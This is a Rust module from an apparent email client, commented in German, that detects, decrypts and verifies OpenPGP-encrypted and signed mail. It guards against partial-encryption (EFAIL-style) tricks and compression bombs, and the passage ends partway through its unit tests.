//! Verschlüsselte und signierte Mails erkennen, entschlüsseln und prüfen (#44).
//!
//! Erkannt werden PGP/MIME (RFC 3156: `multipart/encrypted`, `multipart/signed`) und
//! Inline-PGP (`-----BEGIN PGP MESSAGE-----`, `-----BEGIN PGP SIGNED MESSAGE-----`) im Text.
//!
//! - Entschlüsselt wird nur, wenn die **ganze** Mail verschlüsselt ist (oberster MIME-Teil bzw.
//!   der ganze Text). Ein verschlüsselter Teil zwischen unverschlüsselten Teilen wird nur als
//!   „teilweise verschlüsselt“ gekennzeichnet und nicht entschlüsselt (Schutz vor EFAIL-ähnlichen
//!   Tricks, bei denen fremder Inhalt mit dem entschlüsselten zusammengesetzt wird).
//! - Signaturen gelten nur als gültig, wenn eine User-ID des Schlüssels zur Absenderadresse
//!   passt. Ist nur ein Teil der Mail signiert, wird das ausdrücklich gekennzeichnet.
//! - Der entschlüsselte Inhalt wird nur im Arbeitsspeicher gehalten (`Zeroizing`) und läuft
//!   danach durch dieselbe sichere Anzeige wie jede andere Mail.

use std::io::Read;

use mail_parser::{Message as MimeNachricht, MessageParser, MimeHeaders, PartType};
use pgp::composed::{
    DecryptionOptions, Deserializable, DetachedSignature, Message, SignedPublicKey,
    SignedSecretKey, TheRing,
};
use pgp::packet::Signature;
use pgp::types::{KeyDetails, KeyId, Password, VerifyingKey};
use serde::Serialize;
use zeroize::Zeroizing;

use super::schluessel::{self, fingerabdruck_anzeige};

/// Höchstens so viele Bytes werden entschlüsselt (Schutz vor Kompressionsbomben).
const MAX_KLARTEXT: u64 = 64 * 1024 * 1024;

/// Zustand der Verschlüsselung.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Default)]
#[serde(rename_all = "snake_case")]
pub enum Verschluesselung {
    /// Nicht verschlüsselt.
    #[default]
    Keine,
    /// Verschlüsselt und erfolgreich entschlüsselt.
    Entschluesselt,
    /// Verschlüsselt, konnte aber nicht entschlüsselt werden (siehe Meldung).
    NichtEntschluesselt,
    /// Nur ein Teil der Mail ist verschlüsselt; aus Sicherheitsgründen nicht entschlüsselt.
    Teilweise,
}

/// Ergebnis der Signaturprüfung.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Default, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum Signatur {
    /// Nicht signiert.
    #[default]
    Keine,
    /// Signiert mit einem unbekannten Schlüssel.
    Unbekannt,
    /// Signatur passt nicht zum Inhalt (manipuliert) oder ist kaputt.
    Ungueltig,
    /// Nur S/MIME: Das Zertifikat war zum Zeitpunkt der Signatur abgelaufen oder noch nicht gültig.
    Abgelaufen,
    /// Mathematisch gültig, aber der Schlüssel gehört nicht zur Absenderadresse.
    AndereAdresse,
    /// Gültig und der Schlüssel gehört zur Absenderadresse.
    Gueltig,
}

/// Verfahren der Ende-zu-Ende-Verschlüsselung (auch die Wahl beim Senden).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, serde::Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum Verfahren {
    #[default]
    OpenPgp,
    /// S/MIME (#56)
    Smime,
}

/// Ergebnis für die Anzeige (OpenPGP und S/MIME).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Default)]
pub struct PgpStatus {
    /// OpenPGP oder S/MIME.
    pub verfahren: Verfahren,
    pub verschluesselung: Verschluesselung,
    pub signatur: Signatur,
    /// Nur ein Teil der Mail ist signiert.
    pub signatur_teilweise: bool,
    /// User-ID des Signaturschlüssels (falls bekannt).
    pub signierer: Option<String>,
    /// Fingerabdruck bzw. Schlüssel-ID des Signaturschlüssels (zur Anzeige).
    pub signierer_schluessel: Option<String>,
    /// Erklärung, z. B. warum nicht entschlüsselt werden konnte.
    pub meldung: Option<String>,
    /// Fingerabdruck (zur Anzeige) des eigenen Schlüssels, dessen Passphrase fehlt.
    pub passphrase_fuer: Option<String>,
    /// Zusätzliche, dezente Hinweise (nur S/MIME, z. B. „Sperrstatus nicht online geprüft“).
    pub hinweise: Vec<String>,
    /// Nur S/MIME: Das Zertifikat des Absenders kann übernommen werden (gültig signiert und noch
    /// nicht gespeichert).
    pub zertifikat_uebernehmbar: bool,
}

impl PgpStatus {
    /// Ist die Mail verschlüsselt (ganz oder teilweise)?
    pub fn verschluesselt(&self) -> bool {
        self.verschluesselung != Verschluesselung::Keine
    }
}

/// Die Schlüssel, mit denen entschlüsselt und geprüft wird.
#[derive(Default)]
pub struct Schluesselring {
    /// Eigene private Schlüssel mit Passphrase (falls bekannt bzw. nicht nötig).
    pub eigene: Vec<(SignedSecretKey, Option<Zeroizing<String>>)>,
    /// Öffentliche Schlüssel (eigene und importierte) zum Prüfen von Signaturen.
    pub oeffentliche: Vec<SignedPublicKey>,
}

/// Ergebnis der Verarbeitung.
#[derive(Default)]
pub struct Verarbeitet {
    /// Fassung der Mail zur Anzeige, falls sie sich vom Original unterscheidet
    /// (entschlüsselt oder ohne Signaturteil). Nie dauerhaft speichern.
    pub roh: Option<Zeroizing<Vec<u8>>>,
    pub status: PgpStatus,
    /// Nur S/MIME: Zertifikat des Signierers (DER), wenn die Signatur gültig ist.
    pub zertifikat: Option<Vec<u8>>,
}

/// Fehler beim Entschlüsseln.
#[derive(Debug, PartialEq, Eq)]
enum Fehler {
    /// Kein passender privater Schlüssel vorhanden.
    KeinSchluessel,
    /// Passender Schlüssel vorhanden, aber Passphrase fehlt (Fingerabdruck zur Anzeige).
    PassphraseNoetig(String),
    /// Nachricht kaputt, manipuliert oder nicht unterstützt.
    Kaputt,
}

impl Fehler {
    fn in_status(self, status: &mut PgpStatus) {
        status.verschluesselung = Verschluesselung::NichtEntschluesselt;
        status.meldung = Some(match self {
            Fehler::KeinSchluessel => "Die Mail kann nicht entschlüsselt werden: Es gibt keinen passenden privaten Schlüssel.".into(),
            Fehler::PassphraseNoetig(fingerabdruck) => {
                status.passphrase_fuer = Some(fingerabdruck);
                "Zum Entschlüsseln wird die Passphrase deines Schlüssels benötigt.".into()
            }
            Fehler::Kaputt => "Die Mail kann nicht entschlüsselt werden: Sie ist beschädigt, manipuliert oder verwendet ein nicht unterstütztes Verfahren.".into(),
        });
    }
}

/// Signaturprüfung im Ergebnis.
struct Pruefung {
    signatur: Signatur,
    signierer: Option<String>,
    schluessel: Option<String>,
}

impl Pruefung {
    fn keine() -> Self {
        Self {
            signatur: Signatur::Keine,
            signierer: None,
            schluessel: None,
        }
    }

    fn in_status(self, status: &mut PgpStatus) {
        status.signatur = self.signatur;
        status.signierer = self.signierer;
        status.signierer_schluessel = self.schluessel;
    }
}

/// Kann die Mail OpenPGP enthalten? Schnelle Vorprüfung, damit für gewöhnliche Mails der
/// Schlüsselspeicher gar nicht erst geöffnet wird.
pub fn moeglich(roh: &[u8]) -> bool {
    let enthaelt = |merkmal: &[u8]| {
        roh.windows(merkmal.len())
            .any(|fenster| fenster.eq_ignore_ascii_case(merkmal))
    };
    enthaelt(b"multipart/encrypted")
        || enthaelt(b"multipart/signed")
        || enthaelt(b"-----BEGIN PGP ")
}

/// Erkennt OpenPGP in einer Mail, entschlüsselt und prüft. `absender` ist die (erste)
/// Absenderadresse.
pub fn verarbeiten(roh: &[u8], ring: &Schluesselring) -> Verarbeitet {
    let mut ergebnis = Verarbeitet::default();
    let Some(nachricht) = MessageParser::default().parse(roh) else {
        return ergebnis;
    };
    let absender = absender_von(&nachricht);
    let wurzel = mime_typ(&nachricht, 0);

    match wurzel.as_str() {
        "multipart/encrypted" => {
            let Some(daten) = kind_inhalt(&nachricht, 0, 1) else {
                Fehler::Kaputt.in_status(&mut ergebnis.status);
                return ergebnis;
            };
            match entschluesseln(&daten, ring, absender.as_deref()) {
                Ok((klartext, pruefung)) => {
                    ergebnis.status.verschluesselung = Verschluesselung::Entschluesselt;
                    pruefung.in_status(&mut ergebnis.status);
                    let anzeige = mit_aeusserem_kopf(roh, &nachricht, &klartext);
                    // Innen PGP/MIME-signiert (signieren, dann verschlüsseln)?
                    if ergebnis.status.signatur == Signatur::Keine {
                        if let Some((inhalt, pruefung)) =
                            signiert_pruefen(&anzeige, ring, absender.as_deref())
                        {
                            pruefung.in_status(&mut ergebnis.status);
                            ergebnis.roh = Some(inhalt);
                            return ergebnis;
                        }
                    }
                    ergebnis.roh = Some(anzeige);
                }
                Err(fehler) => fehler.in_status(&mut ergebnis.status),
            }
        }
        "multipart/signed" => {
            if let Some((inhalt, pruefung)) = signiert_pruefen(roh, ring, absender.as_deref()) {
                pruefung.in_status(&mut ergebnis.status);
                ergebnis.roh = Some(inhalt);
            }
        }
        "text/plain" | "" => {
            let text = nachricht
                .body_text(0)
                .map(|t| t.into_owned())
                .unwrap_or_default();
            inline_verarbeiten(
                roh,
                &nachricht,
                &text,
                ring,
                absender.as_deref(),
                &mut ergebnis,
            );
        }
        _ => teile_pruefen(
            roh,
            &nachricht,
            ring,
            absender.as_deref(),
            &mut ergebnis.status,
        ),
    }
    ergebnis
}

/// Inline-PGP im Text der Mail.
fn inline_verarbeiten(
    roh: &[u8],
    nachricht: &MimeNachricht,
    text: &str,
    ring: &Schluesselring,
    absender: Option<&str>,
    ergebnis: &mut Verarbeitet,
) {
    const NACHRICHT: (&str, &str) = ("-----BEGIN PGP MESSAGE-----", "-----END PGP MESSAGE-----");
    const SIGNIERT: (&str, &str) = (
        "-----BEGIN PGP SIGNED MESSAGE-----",
        "-----END PGP SIGNATURE-----",
    );
    if let Some((block, ganz)) = block_finden(text, NACHRICHT) {
        if !ganz {
            ergebnis.status.verschluesselung = Verschluesselung::Teilweise;
            ergebnis.status.meldung = Some(TEILWEISE_VERSCHLUESSELT.into());
            return;
        }
        match entschluesseln(block.as_bytes(), ring, absender) {
            Ok((klartext, pruefung)) => {
                ergebnis.status.verschluesselung = Verschluesselung::Entschluesselt;
                pruefung.in_status(&mut ergebnis.status);
                let mut innen = b"Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n".to_vec();
                innen.extend_from_slice(&klartext);
                ergebnis.roh = Some(mit_aeusserem_kopf(roh, nachricht, &innen));
            }
            Err(fehler) => fehler.in_status(&mut ergebnis.status),
        }
    } else if let Some((block, ganz)) = block_finden(text, SIGNIERT) {
        let Ok((signiert, _)) = pgp::composed::CleartextSignedMessage::from_string(block) else {
            ergebnis.status.signatur = Signatur::Ungueltig;
            ergebnis.status.signatur_teilweise = !ganz;
            return;
        };
        let text = signiert.signed_text();
        let signaturen: Vec<(&Signature, Pruefer)> = signiert
            .signatures()
            .iter()
            .map(|s| {
                let text = text.as_bytes();
                let pruefer: Pruefer = Box::new(move |teil: Teil| teil.pruefen(s, text));
                (s, pruefer)
            })
            .collect();
        bewerten(signaturen, ring, absender).in_status(&mut ergebnis.status);
        ergebnis.status.signatur_teilweise = !ganz;
        if ganz {
            let mut innen = b"Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\n".to_vec();
            innen.extend_from_slice(signiert.text().as_bytes());
            ergebnis.roh = Some(mit_aeusserem_kopf(roh, nachricht, &innen));
        }
    }
}

pub(crate) const TEILWEISE_VERSCHLUESSELT: &str = "Nur ein Teil dieser Mail ist verschlüsselt. Aus Sicherheitsgründen wird er nicht automatisch entschlüsselt, weil unverschlüsselte Teile den Inhalt verfälschen oder ausspähen könnten.";

/// Sucht einen Armor-Block im Text. Gibt den Block und ob er der ganze Text ist zurück.
fn block_finden<'a>(text: &'a str, (anfang, ende): (&str, &str)) -> Option<(&'a str, bool)> {
    let start = text.find(anfang)?;
    // Der Anfang muss am Zeilenanfang stehen.
    if start > 0 && !text[..start].ends_with('\n') {
        return None;
    }
    let stop = text[start..].find(ende)? + start + ende.len();
    let ganz = text[..start].trim().is_empty() && text[stop..].trim().is_empty();
    Some((&text[start..stop], ganz))
}

/// Durchsucht verschachtelte Teile: Verschlüsselte Teile werden nur gekennzeichnet,
/// signierte Teile geprüft und als „teilweise signiert“ gekennzeichnet.
fn teile_pruefen(
    roh: &[u8],
    nachricht: &MimeNachricht,
    ring: &Schluesselring,
    absender: Option<&str>,
    status: &mut PgpStatus,
) {
    for (index, teil) in nachricht.parts.iter().enumerate().skip(1) {
        let typ = mime_typ(nachricht, index);
        let text_mit_block = match &teil.body {
            PartType::Text(t) => t.contains("-----BEGIN PGP MESSAGE-----"),
            _ => false,
        };
        if typ == "multipart/encrypted" || text_mit_block {
            status.verschluesselung = Verschluesselung::Teilweise;
            status.meldung = Some(TEILWEISE_VERSCHLUESSELT.into());
        } else if typ == "multipart/signed" && status.signatur == Signatur::Keine {
            let start = teil.offset_header as usize;
            let ende = teil.offset_end as usize;
            if let Some(entitaet) = roh.get(start..ende) {
                if let Some((_, pruefung)) = signiert_pruefen(entitaet, ring, absender) {
                    pruefung.in_status(status);
                    status.signatur_teilweise = true;
                }
            }
        } else if let PartType::Text(t) = &teil.body {
            if t.contains("-----BEGIN PGP SIGNED MESSAGE-----")
                && status.signatur == Signatur::Keine
            {
                let mut innen = Verarbeitet::default();
                inline_verarbeiten(roh, nachricht, t, ring, absender, &mut innen);
                status.signatur = innen.status.signatur;
                status.signierer = innen.status.signierer;
                status.signierer_schluessel = innen.status.signierer_schluessel;
                status.signatur_teilweise = true;
            }
        }
    }
}

/// Absenderadresse (erste From-Adresse), kleingeschrieben.
pub(crate) fn absender_von(nachricht: &MimeNachricht) -> Option<String> {
    nachricht
        .from()
        .and_then(|a| a.first())
        .and_then(|a| a.address())
        .map(|a| a.trim().to_lowercase())
}

/// MIME-Typ eines Teils, kleingeschrieben (`typ/untertyp`), leer wenn unbekannt.
pub(crate) fn mime_typ(nachricht: &MimeNachricht, teil: usize) -> String {
    nachricht
        .parts
        .get(teil)
        .and_then(|t| t.content_type())
        .map(|t| {
            format!(
                "{}/{}",
                t.ctype().to_ascii_lowercase(),
                t.subtype().unwrap_or_default().to_ascii_lowercase()
            )
        })
        .unwrap_or_default()
}

/// Inhalt (dekodiert) des `nr`-ten Kindes eines Multipart-Teils.
pub(crate) fn kind_inhalt(nachricht: &MimeNachricht, teil: usize, nr: usize) -> Option<Vec<u8>> {
    let PartType::Multipart(kinder) = &nachricht.parts.get(teil)?.body else {
        return None;
    };
    let kind = nachricht.parts.get(*kinder.get(nr)? as usize)?;
    Some(kind.contents().to_vec())
}

/// Baut eine anzeigbare Mail: äussere Kopfzeilen (ohne `Content-*` und `MIME-Version`) und
/// die innere MIME-Entität.
pub(crate) fn mit_aeusserem_kopf(
    roh: &[u8],
    nachricht: &MimeNachricht,
    innen: &[u8],
) -> Zeroizing<Vec<u8>> {
    let mut neu = Zeroizing::new(Vec::with_capacity(innen.len() + 2048));
    for kopf in nachricht.headers() {
        let name = kopf.name.as_str().to_ascii_lowercase();
        if name.starts_with("content-") || name == "mime-version" {
            continue;
        }
        if let Some(zeile) = roh.get(kopf.offset_field as usize..kopf.offset_end as usize) {
            neu.extend_from_slice(zeile);
            if !zeile.ends_with(b"\n") {
                neu.extend_from_slice(b"\r\n");
            }
        }
    }
    neu.extend_from_slice(b"MIME-Version: 1.0\r\n");
    neu.extend_from_slice(innen);
    neu
}

/// Wandelt alle Zeilenenden in CRLF um (kanonische Form für Signaturen, RFC 3156).
pub(crate) fn crlf(daten: &[u8]) -> Vec<u8> {
    let mut aus = Vec::with_capacity(daten.len() + daten.len() / 32);
    let mut vorher = 0u8;
    for &b in daten {
        if b == b'\n' && vorher != b'\r' {
            aus.push(b'\r');
        }
        aus.push(b);
        vorher = b;
    }
    aus
}

/// Prüft eine PGP/MIME-signierte Entität (`multipart/signed`). Gibt die Mail zur Anzeige
/// (äussere Kopfzeilen + signierter Teil) und das Prüfergebnis zurück.
fn signiert_pruefen(
    entitaet: &[u8],
    ring: &Schluesselring,
    absender: Option<&str>,
) -> Option<(Zeroizing<Vec<u8>>, Pruefung)> {
    let kanonisch = crlf(entitaet);
    let nachricht = MessageParser::default().parse(&kanonisch)?;
    if mime_typ(&nachricht, 0) != "multipart/signed" {
        return None;
    }
    let grenze = nachricht
        .parts
        .first()?
        .content_type()?
        .attribute("boundary")?
        .to_string();
    let signiert = signierter_teil(&kanonisch, &grenze)?;
    let signatur_daten = kind_inhalt(&nachricht, 0, 1)?;
    let pruefung = match DetachedSignature::from_reader_single(&signatur_daten[..]) {
        Ok((signatur, _)) => {
            let signatur = &signatur.signature;
            let pruefer: Pruefer = Box::new(|teil: Teil| teil.pruefen(signatur, signiert));
            bewerten(vec![(signatur, pruefer)], ring, absender)
        }
        Err(_) => Pruefung {
            signatur: Signatur::Ungueltig,
            signierer: None,
            schluessel: None,
        },
    };
    Some((
        mit_aeusserem_kopf(&kanonisch, &nachricht, signiert),
        pruefung,
    ))
}

/// Der signierte Teil zwischen dem ersten und dem zweiten Begrenzer, genau wie übertragen
/// (ohne das CRLF vor dem zweiten Begrenzer).
pub(crate) fn signierter_teil<'a>(entitaet: &'a [u8], grenze: &str) -> Option<&'a [u8]> {
    let begrenzer = format!("--{grenze}");
    let b = begrenzer.as_bytes();
    // Erster Begrenzer am Zeilenanfang
    let mut pos = 0;
    let start = loop {
        let fund = finden(&entitaet[pos..], b)? + pos;
        if fund == 0 || entitaet[..fund].ends_with(b"\n") {
            // Rest der Begrenzerzeile überspringen
            let zeilenende = finden(&entitaet[fund..], b"\r\n")? + fund + 2;
            break zeilenende;
        }
        pos = fund + b.len();
    };
    let mut zweiter = Vec::with_capacity(b.len() + 2);
    zweiter.extend_from_slice(b"\r\n");
    zweiter.extend_from_slice(b);
    let ende = finden(&entitaet[start..], &zweiter)? + start;
    entitaet.get(start..ende)
}

pub(crate) fn finden(heu: &[u8], nadel: &[u8]) -> Option<usize> {
    heu.windows(nadel.len()).position(|w| w == nadel)
}

/// Prüffunktion für eine Signatur mit einem Schlüsselteil.
type Pruefer<'a> = Box<dyn Fn(Teil) -> bool + 'a>;

/// Haupt- oder Unterschlüssel eines öffentlichen Schlüssels.
#[derive(Clone, Copy)]
enum Teil<'a> {
    Haupt(&'a pgp::packet::PublicKey),
    Unter(&'a pgp::packet::PublicSubkey),
}

impl Teil<'_> {
    fn als_dyn(&self) -> &dyn VerifyingKey {
        match self {
            Teil::Haupt(k) => *k,
            Teil::Unter(k) => *k,
        }
    }

    /// Prüft eine Signatur über `daten`.
    fn pruefen(&self, signatur: &Signature, daten: &[u8]) -> bool {
        match self {
            Teil::Haupt(k) => signatur.verify(*k, daten).is_ok(),
            Teil::Unter(k) => signatur.verify(*k, daten).is_ok(),
        }
    }
}

/// Ein Schlüsselteil mit dem Schlüssel, zu dem er gehört.
struct Kandidat<'a> {
    schluessel: &'a SignedPublicKey,
    teil: Teil<'a>,
}

fn kandidaten(ring: &Schluesselring) -> Vec<Kandidat<'_>> {
    let mut alle = Vec::new();
    for schluessel in &ring.oeffentliche {
        alle.push(Kandidat {
            schluessel,
            teil: Teil::Haupt(&schluessel.primary_key),
        });
        for unter in &schluessel.public_subkeys {
            alle.push(Kandidat {
                schluessel,
                teil: Teil::Unter(&unter.key),
            });
        }
    }
    alle
}

/// Passt der Schlüsselteil zum Aussteller der Signatur?
fn aussteller_passt(signatur: &Signature, teil: Teil) -> bool {
    let teil = teil.als_dyn();
    let fingerabdruecke = signatur.issuer_fingerprint();
    let ids = signatur.issuer_key_id();
    if fingerabdruecke.is_empty() && ids.is_empty() {
        // Ohne Angabe: jeden Schlüssel versuchen.
        return true;
    }
    let fingerabdruck = teil.fingerprint();
    let id: KeyId = teil.legacy_key_id();
    fingerabdruecke.iter().any(|f| **f == fingerabdruck) || ids.iter().any(|i| **i == id)
}

/// Bewertet Signaturen: bestes Ergebnis zählt.
fn bewerten(
    signaturen: Vec<(&Signature, Pruefer<'_>)>,
    ring: &Schluesselring,
    absender: Option<&str>,
) -> Pruefung {
    let kandidaten = kandidaten(ring);
    let mut beste = Pruefung::keine();
    for (signatur, pruefer) in signaturen {
        let passende: Vec<&Kandidat> = kandidaten
            .iter()
            .filter(|k| aussteller_passt(signatur, k.teil))
            .collect();
        let ergebnis = if passende.is_empty() {
            let schluessel = signatur
                .issuer_fingerprint()
                .first()
                .map(|f| fingerabdruck_anzeige(&hex::encode_upper(f.as_bytes())))
                .or_else(|| {
                    signatur
                        .issuer_key_id()
                        .first()
                        .map(|i| fingerabdruck_anzeige(&hex::encode_upper(i.as_ref())))
                });
            Pruefung {
                signatur: Signatur::Unbekannt,
                signierer: None,
                schluessel,
            }
        } else {
            match passende.iter().find(|k| pruefer(k.teil)) {
                Some(k) => {
                    let info = schluessel::info(k.schluessel);
                    let passt =
                        absender.is_some_and(|a| schluessel::passt_zu_adresse(k.schluessel, a));
                    Pruefung {
                        signatur: if passt {
                            Signatur::Gueltig
                        } else {
                            Signatur::AndereAdresse
                        },
                        signierer: info.benutzer_ids.first().cloned(),
                        schluessel: Some(info.fingerabdruck),
                    }
                }
                None => Pruefung {
                    signatur: Signatur::Ungueltig,
                    signierer: None,
                    schluessel: Some(schluessel::info(passende[0].schluessel).fingerabdruck),
                },
            }
        };
        if ergebnis.signatur > beste.signatur || beste.signatur == Signatur::Keine {
            beste = ergebnis;
        }
    }
    beste
}

/// Entschlüsselt eine OpenPGP-Nachricht (armored oder binär) und prüft enthaltene Signaturen.
fn entschluesseln(
    daten: &[u8],
    ring: &Schluesselring,
    absender: Option<&str>,
) -> Result<(Zeroizing<Vec<u8>>, Pruefung), Fehler> {
    let (nachricht, _) =
        Message::from_reader(std::io::BufReader::new(daten)).map_err(|_| Fehler::Kaputt)?;
    let Message::Encrypted { esk, .. } = &nachricht else {
        return Err(Fehler::Kaputt);
    };
    // Für welche eigenen Schlüssel ist die Nachricht verschlüsselt?
    let mut empfaenger: Vec<KeyId> = Vec::new();
    let mut anonym = false;
    for e in esk {
        if let pgp::composed::Esk::PublicKeyEncryptedSessionKey(p) = e {
            match p.id() {
                Ok(id) if id.is_wildcard() => anonym = true,
                Ok(id) => empfaenger.push(*id),
                Err(_) => anonym = true,
            }
        }
    }
    let passende: Vec<&(SignedSecretKey, Option<Zeroizing<String>>)> = ring
        .eigene
        .iter()
        .filter(|(s, _)| {
            anonym
                || empfaenger.contains(&s.primary_key.legacy_key_id())
                || s.secret_subkeys
                    .iter()
                    .any(|u| empfaenger.contains(&u.key.legacy_key_id()))
        })
        .collect();
    if passende.is_empty() {
        return Err(Fehler::KeinSchluessel);
    }
    let bereit: Vec<&(SignedSecretKey, Option<Zeroizing<String>>)> = passende
        .iter()
        .copied()
        .filter(|(_, p)| p.is_some())
        .collect();
    if bereit.is_empty() {
        let fingerabdruck =
            fingerabdruck_anzeige(&schluessel::fingerabdruck_hex(&passende[0].0.primary_key));
        return Err(Fehler::PassphraseNoetig(fingerabdruck));
    }
    let passwoerter: Vec<Password> = bereit
        .iter()
        .map(|(_, p)| Password::from(p.as_deref().map(String::as_str).unwrap_or("")))
        .collect();
    // Auch das AEAD-Format von GnuPG 2.4 (OCB, „LibrePGP“) lesen: Es ist authentisiert.
    // Ungeschützte Altformate (SED ohne MDC) bleiben abgelehnt.
    let ring_pgp = TheRing {
        secret_keys: bereit.iter().map(|(s, _)| s).collect(),
        key_passwords: passwoerter.iter().collect(),
        decrypt_options: DecryptionOptions::new().enable_gnupg_aead(),
        ..Default::default()
    };
    let (mut entschluesselt, _) = nachricht
        .decrypt_the_ring(ring_pgp, true)
        .map_err(|_| Fehler::Kaputt)?;
    while entschluesselt.is_compressed() {
        entschluesselt = entschluesselt.decompress().map_err(|_| Fehler::Kaputt)?;
    }
    if entschluesselt.is_signed() {
        entschluesselt = entschluesselt.decompress().map_err(|_| Fehler::Kaputt)?;
    }
    let mut klartext = Zeroizing::new(Vec::new());
    (&mut entschluesselt)
        .take(MAX_KLARTEXT + 1)
        .read_to_end(&mut klartext)
        .map_err(|_| Fehler::Kaputt)?;
    if klartext.len() as u64 > MAX_KLARTEXT {
        return Err(Fehler::Kaputt);
    }
    let pruefung = match &entschluesselt {
        Message::Signed { reader, .. } => {
            let signaturen: Vec<(&Signature, Pruefer)> = (0..reader.num_signatures())
                .filter_map(|i| {
                    let signatur = reader.signature(i)?;
                    let nachricht = &entschluesselt;
                    let pruefer: Pruefer = Box::new(move |teil: Teil| {
                        nachricht.verify_nested_explicit(i, teil.als_dyn()).is_ok()
                    });
                    Some((signatur, pruefer))
                })
                .collect();
            bewerten(signaturen, ring, absender)
        }
        _ => Pruefung::keine(),
    };
    Ok((klartext, pruefung))
}

#[cfg(test)]
pub(crate) mod tests {
    use std::sync::OnceLock;

    use pgp::composed::{ArmorOptions, MessageBuilder};
    use pgp::crypto::hash::HashAlgorithm;
    use pgp::crypto::sym::SymmetricKeyAlgorithm;
    use rand::rngs::OsRng;

    use super::*;
    use crate::pgp::schluessel::erzeugen;

    pub(crate) const PASSPHRASE: &str = "test-passphrase";

    /// Eigens für Tests erzeugte Schlüssel (einmal pro Testlauf).
    pub(crate) struct Testschluessel {
        pub anna: SignedSecretKey,
        pub bea: SignedSecretKey,
        pub carl: SignedSecretKey,
    }

    pub(crate) fn schluessel() -> &'static Testschluessel {
        static S: OnceLock<Testschluessel> = OnceLock::new();
        S.get_or_init(|| Testschluessel {
            anna: erzeugen("Anna", "anna@example.org", PASSPHRASE).unwrap(),
            bea: erzeugen("Bea", "bea@example.org", PASSPHRASE).unwrap(),
            carl: erzeugen("Carl", "carl@example.org", PASSPHRASE).unwrap(),
        })
    }

    /// Ring von Anna: eigener Schlüssel (mit oder ohne Passphrase) und bekannte öffentliche.
    fn ring(passphrase: Option<&str>, bekannt: &[&SignedSecretKey]) -> Schluesselring {
        let s = schluessel();
        Schluesselring {
            eigene: vec![(
                s.anna.clone(),
                passphrase.map(|p| Zeroizing::new(p.to_string())),
            )],
            oeffentliche: std::iter::once(&s.anna)
                .chain(bekannt.iter().copied())
                .map(|k| k.to_public_key())
                .collect(),
        }
    }

    /// Verschlüsselt (und signiert optional) mit rPGP, ASCII-armored.
    pub(crate) fn verschluesseln(
        klartext: &[u8],
        an: &SignedSecretKey,
        signierer: Option<&SignedSecretKey>,
    ) -> String {
        let empfaenger = an.to_public_key();
        let mut builder = MessageBuilder::from_bytes("", klartext.to_vec())
            .seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);
        builder
            .encrypt_to_key(OsRng, &empfaenger.public_subkeys[0])
            .unwrap();
        if let Some(s) = signierer {
            builder.sign(
                &s.primary_key,
                Password::from(PASSPHRASE),
                HashAlgorithm::Sha256,
            );
        }
        builder
            .to_armored_string(OsRng, ArmorOptions::default())
            .unwrap()
    }

    fn signatur(signierer: &SignedSecretKey, daten: &[u8]) -> String {
        DetachedSignature::sign_binary_data(
            OsRng,
            &signierer.primary_key,
            &Password::from(PASSPHRASE),
            HashAlgorithm::Sha256,
            daten,
        )
        .unwrap()
        .to_armored_string(ArmorOptions::default())
        .unwrap()
    }

    pub(crate) fn kopf(von: &str) -> String {
        format!("From: Absender <{von}>\r\nTo: Anna <anna@example.org>\r\nSubject: Test\r\nMessage-ID: <t@example.org>\r\nMIME-Version: 1.0\r\n")
    }

    pub(crate) fn pgp_mime(von: &str, armored: &str) -> String {
        format!(
            "{}Content-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"aussen\"\r\n\r\n\
This is an OpenPGP/MIME encrypted message (RFC 4880 and 3156)\r\n\
--aussen\r\nContent-Type: application/pgp-encrypted\r\nContent-Description: PGP/MIME version identification\r\n\r\nVersion: 1\r\n\r\n\
--aussen\r\nContent-Type: application/octet-stream; name=\"encrypted.asc\"\r\nContent-Disposition: inline; filename=\"encrypted.asc\"\r\n\r\n\
{}\r\n--aussen--\r\n",
            kopf(von),
            armored
        )
    }

    pub(crate) fn signiert_mime(von: &str, teil: &str, signatur: &str) -> String {
        format!(
            "{}Content-Type: multipart/signed; micalg=pgp-sha256; protocol=\"application/pgp-signature\"; boundary=\"sig\"\r\n\r\n\
--sig\r\n{}\r\n--sig\r\nContent-Type: application/pgp-signature; name=\"signature.asc\"\r\n\r\n{}\r\n--sig--\r\n",
            kopf(von),
            teil,
            signatur
        )
    }

    const INNEN: &str =
        "Content-Type: text/plain; charset=utf-8\r\n\r\nHallo Anna, das ist geheim.\r\n";

    #[test]
    fn verschluesselt_und_signiert_wird_gelesen() {
        let s = schluessel();
        let mail = pgp_mime(
            "bea@example.org",
            &verschluesseln(INNEN.as_bytes(), &s.anna, Some(&s.bea)),
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some(PASSPHRASE), &[&s.bea]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::Entschluesselt
        );
        assert_eq!(ergebnis.status.signatur, Signatur::Gueltig);
        assert_eq!(
            ergebnis.status.signierer.as_deref(),
            Some("Bea <bea@example.org>")
        );
        assert!(!ergebnis.status.signatur_teilweise);
        let anzeige = crate::anzeige::aufbereiten(&ergebnis.roh.unwrap(), None).unwrap();
        assert_eq!(anzeige.betreff, "Test");
        assert_eq!(anzeige.von[0].adresse, "bea@example.org");
        assert!(anzeige.text.contains("das ist geheim"));
    }

    #[test]
    fn ohne_passphrase_wird_sie_verlangt() {
        let s = schluessel();
        let mail = pgp_mime(
            "bea@example.org",
            &verschluesseln(INNEN.as_bytes(), &s.anna, None),
        );
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(None, &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::NichtEntschluesselt
        );
        assert!(ergebnis.status.passphrase_fuer.is_some());
        assert!(ergebnis.roh.is_none());

        // Falsche Passphrase: nicht entschlüsselt, kein Klartext.
        let ergebnis = verarbeiten(mail.as_bytes(), &ring(Some("falsch-falsch"), &[]));
        assert_eq!(
            ergebnis.status.verschluesselung,
            Verschluesselung::NichtEntschluesselt
        );
        assert!(ergebnis.roh.is_none());
    }

    #[test]
